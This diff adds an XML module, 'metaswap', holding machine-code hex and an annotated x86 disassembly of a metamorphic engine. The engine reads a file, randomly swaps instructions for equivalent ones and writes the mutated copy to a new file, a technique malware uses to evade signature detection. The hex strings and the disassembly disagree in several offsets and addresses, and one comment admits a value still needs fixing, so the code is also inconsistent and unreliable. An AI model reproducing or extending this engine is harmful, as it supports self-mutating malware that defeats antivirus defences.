@@ -1,0 +1,125 @@
+<odo>
+	<name>metaswap</name>
+	<description>Swaps several instructions with equivalent instructions based on a % chance.</description>
+	<code>E8FBFDFFFFB808000000BB10244000B9FF010000CD8089C3B806000000CD80B805000000BB00244000B900000000BAFF010000CD8089C353B803000000B968244000668B142560244000CD80B8060000005BCD80FE042576484000FE04258648400031F6BE002040004831C9B9000200004831C066AD4831DB89C351564831F64831C9BEFE224000B90D0000004831C066AD39D875290F314831DB83C30F4821D84883F8047D1831C08B461A31DB5B89DA83EA0281C2682400005366678902E2CC5E5948FFCEE2A9B805000000BB10244000B902000000BAFF010000CD8089C353B804000000B968244000668B142560244000CD80B8060000005BCD80C331C031DB31C931D231F689D889C829C029DB29C929D229F65358515829C029DB29C929D229F65358515831C031DB31C931D231F689D889C8</code>
+	E8FBFDFFFFB808000000BB10244000B9FF010000CD8089C3B806000000CD80B805000000BB00244000B900000000BAFF010000CD8089C353B803000000B968244000668B142560244000CD80B8060000005BCD80FE042576484000FE04258648400031F6BE002040004831C9B9000200004831C066AD4831DB89C351564831F64831C9BEED224000B9060000004831C066AD39D875290F314831DB83C30F4821D84883F8047D1831C08B460A31DB5B89DA83EA0281C2682400005366678902E2CC5E5948FFCEE2A9B805000000BB10244000B902000000BAFF010000CD8089C353B804000000B968244000668B142560244000CD80B8060000005BCD80C331C031DB31C931D231F689D829C029DB29C929D229F65358
+	<disassemble>
+	
+		call payload 			; E8FBFDFFFF
+		
+		; create a new file
+		mov eax, 8           ; B808000000
+		mov ebx, filename2   ; BB10244000
+		mov ecx, 0777o	     ; B9FF010000
+		int 80h				 ; CD80
+		
+		; close the file
+		mov ebx, eax			; 89C3
+		mov eax, 6			  ; B806000000
+		int 80h				  ; CD80
+		
+		;open the file for reading
+		mov eax, 5				; B805000000
+		mov ebx, filename		; BB00244000
+		mov ecx, 0             ; B900000000
+		mov edx, 0777o          ; BAFF010000
+		int  80h				; CD80
+
+		;read from file
+		mov ebx, eax			; 89C3
+		push ebx				; 53
+		mov eax, 3					; B803000000
+		mov ecx, newsource			; B968244000					*
+		mov dx, [filesize]			; 668B142560244000
+		int 80h						; CD80
+
+		; close the file
+		mov eax, 6					; B806000000
+		pop ebx						; 5B
+		int 80h						; CD80
+		
+		inc byte [newsource+240E]		;FE042576484000		Increment the first filename variable		*
+		inc byte [newsource+241E]		;FE042586484000		Increment the second filename variable		*
+		
+		xor esi, esi			; 31F6
+		mov esi, payload		; BE00204000
+		xor rcx, rcx			; 4831C9
+		mov ecx, payload_size	; B900020000
+		
+		loop1:
+			xor rax, rax		; 4831C0
+			lodsw				; 66AD
+			xor rbx, rbx		; 4831DB
+			mov ebx, eax		; 89C3
+			
+			push rcx			; 51
+			push rsi			; 56
+			xor rsi, rsi		; 4831F6
+			xor rcx, rcx		; 4831C9
+			mov esi, mutator	; BEFE224000 	<- CHANGE
+			mov ecx, 6			; B906000000			<- CHANGE
+			loop2:
+				xor rax, rax	; 4831C0
+				lodsw			; 66AD
+
+				cmp eax, ebx	; 39D8
+				jne midloop		; 7529
+				
+				rdtsc				; 0F31
+				xor rbx, rbx		; 4831DB
+				add ebx, 00Fh		; 83C30F
+				and rax, rbx		; 4821D8
+				cmp rax, 4			; 4883F804
+				jge midloop:		; 7D18
+				;added 17 bytes (11)
+				
+				xor eax, eax		; 31C0
+				mov eax, [rsi+12]	; 8B460C  -> needs to be increased based on size of comparisons
+				xor ebx, ebx		; 31DB
+				pop rbx				; 5B
+				mov edx, ebx		; 89DA
+				sub edx, 2			; 83EA02
+				add edx, 0402468h	; 81C268240000
+				push rbx			; 53
+				mov [edx], ax		; 66678902
+				
+				midloop:
+				loop loop2			; E2CC
+			
+			pop rsi					; 5E
+			pop rcx					; 59
+			dec rsi					; 48FFCE
+			loop loop1				; E2A9
+			
+			;open the file for writing
+			mov eax, 5									; B805000000
+			mov ebx, filename2							; BB10244000
+			mov ecx, 2             			; B902000000
+			mov edx, 0777o          ;BAFF010000
+			int  80h						; CD80
+
+			
+			; current file to new file
+			mov ebx, eax								; 89C3
+			push ebx									; 53
+			mov eax, 4									; B804000000
+			mov ecx, newsource							; B968244000					*
+			mov dx, [filesize]							; 668B142560244000
+			int 80h										; CD80
+
+			; close the file
+			mov eax, 6									; B806000000
+			pop ebx										; 5B
+			int 80h										; CD80
+			
+			ret 					; C3
+		
+			; xor eax, eax; xor ebx, ebx; xor ecx, ecx; xor edx, edx; xor esi, esi; mov eax, ebx; mov eax, ecx; mov eax, edx;
+			; sub eax, eax; sub ebx, ebx; sub ecx, ecx; sub edx, edx; sub esi, esi; push ebx pop eax
+			db 031h, 0C0h, 031h, 0DBh, 031h, 0C9h, 031h, 0D2h, 031h, 0F6h, 089h, 0D8h, 089h, 0C8h	; 31C031DB31C931D231F689D889C829C029DB29C929D229F65358515829C029DB29C929D229F65358515831C031DB31C931D231F689D889C8     31C031DB31C931D231F689D8 29C029DB29C929D229F65358
+			db 029h, 0C0h, 029h, 0DBh, 029h, 0C9h, 029h, 0D2h, 029h, 0F6h, 053h, 058h, 051h, 058h
+	</disassemble>
+	<changelog>
+		19/08/2019 - Added reverse swaps
+	</changelog>
+</odo>
